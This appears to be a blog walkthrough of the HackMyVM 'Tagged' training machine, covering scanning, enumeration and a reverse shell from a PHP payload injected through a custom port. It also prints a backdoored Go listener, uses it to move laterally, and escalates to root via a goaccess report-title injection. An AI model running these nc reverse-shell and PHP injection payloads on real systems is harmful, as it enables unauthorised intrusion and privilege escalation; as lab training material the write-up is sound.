---
layout: post
title: "HackMyVM - Tagged"
date: 2022-11-14 15:47:00 +0100
categories: hmv
---

Creator: [sml](https://hackmyvm.eu/profile/?user=sml)
Level: Medium
Release Date: 2022-11-14

## Scan

```
$ nmap -sC -sV -oA scans/Tagged -p- 192.168.1.115
```

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-14 17:51 WEST
Nmap scan report for 192.168.1.115
Host is up (0.00036s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
7746/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port7746-TCP:V=7.93%I=7%D=3/28%Time=64231B0B%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1,">")%r(GenericLines,2,">>")%r(GetRequest,2,">>")%r(HTTPOptions,2,"
SF:>>")%r(RTSPRequest,2,">>")%r(RPCCheck,1,">")%r(DNSVersionBindReqTCP,1,"
SF:>")%r(DNSStatusRequestTCP,1,">")%r(Help,2,">>")%r(SSLSessionReq,2,">>")
SF:%r(TerminalServerCookie,2,">>")%r(TLSSessionReq,2,">>")%r(Kerberos,2,">
SF:>");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.62 seconds
```

## Enumeration

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.115 -x php,html,txt,jpg -o scans/gobuster-medium.log
```

```bash
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.115
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,html,txt,jpg
[+] Timeout:                 10s
===============================================================
2022/11/14 17:58:15 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 46]
/report.html          (Status: 200) [Size: 0]
/report.php           (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 24952381]

===============================================================
2022/11/14 17:59:57 Finished
===============================================================
```

## 7746

```bash
$ nc 192.168.1.115 7746
>test
>
```

```bash
$ curl http://192.168.1.115/index.php
<h1>TAGZ</h1>
<pre>test</pre>
```

### Reverse Shell

* Insert Payload

```bash
$ nc 192.168.1.115 7746
><?php system('nc -e /bin/bash 192.168.1.6 4444');?>
>
```

```bash
$ curl http://192.168.1.115/index.php
```

```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.115] 34148
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## magiccode.go

```go
package main

import (
        "bufio"
        "fmt"
        "net"
        "os"
"log"
"os/exec"
"strings"
)

func main() {
        ln, _ := net.Listen("tcp", ":7746")
        for {
                conn, _ := ln.Accept()
                go receiveData(conn)
                go sendData(conn, "")
        }
}

func sendData(conn net.Conn,mensaje string) {
                fmt.Fprintf(conn, mensaje)
}

func receiveData(conn net.Conn){
  for {
  var tohtml string
     sendData(conn, ">")
    message, _ := bufio.NewReader(conn).ReadString('\n')
    message = strings.TrimRight(message, "\r\n")
    tohtml = "<pre>"+message+"</pre>"
    OMG := "Deva"
    if message == OMG {
        cmd := exec.Command("nc","-e","/bin/bash","127.0.0.1","7777")
        _ = cmd.Run()
        }
    file, err := os.OpenFile("/var/www/html/index.php", os.O_APPEND|os.O_WRONLY, 0644)
    _, _ = fmt.Fprintln(file, tohtml)
        if err != nil {
        log.Fatal(err)
        }
 defer file.Close()
  }
}
```

## Lateral Movement (www-data > shyla)

* Local Machine

```
$ nc 192.168.1.115 7746
>Deva
```

* Remote 2x Reverse Shell

```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.115] 45822
nc -lvnp 7777
id
uid=1001(shyla) gid=1001(shyla) grupos=1001(shyla)
```

## Root

```bash
shyla@tagged:~$ sudo -l
Matching Defaults entries for shyla on tagged:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User shyla may run the following commands on tagged:
    (uma) NOPASSWD: /usr/bin/goaccess
    (ALL) NOPASSWD: /usr/bin/php /var/www/html/report.php
shyla@tagged:~$
```

### Exploit Report Title

```bash
shyla@tagged:~$ touch a.log
shyla@tagged:~$ sudo -u uma goaccess -f a.log -o /var/www/html/report.html --html-report-title="<?php system('bash');?>"

shyla@tagged:~$ sudo /usr/bin/php /var/www/html/report.php

root@tagged:/home/shyla# id
uid=0(root) gid=0(root) grupos=0(root)
root@tagged:/home/shyla# 
```

